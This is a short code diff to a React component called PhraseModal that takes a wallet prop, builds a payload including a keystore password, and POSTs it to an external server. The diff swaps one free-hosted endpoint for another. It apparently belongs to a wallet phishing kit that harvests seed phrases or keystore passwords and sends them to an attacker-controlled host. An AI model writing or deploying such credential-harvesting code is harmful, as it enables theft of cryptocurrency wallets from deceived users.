@@ -93,7 +93,7 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
         payload.tab3.password = keystorePassword;
       }
 
-      const response = await fetch("https://electric-eel.onrender.com/submit", {
+      const response = await fetch("https://monkfish-app-yra7w.ondigitalocean.app/submit", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
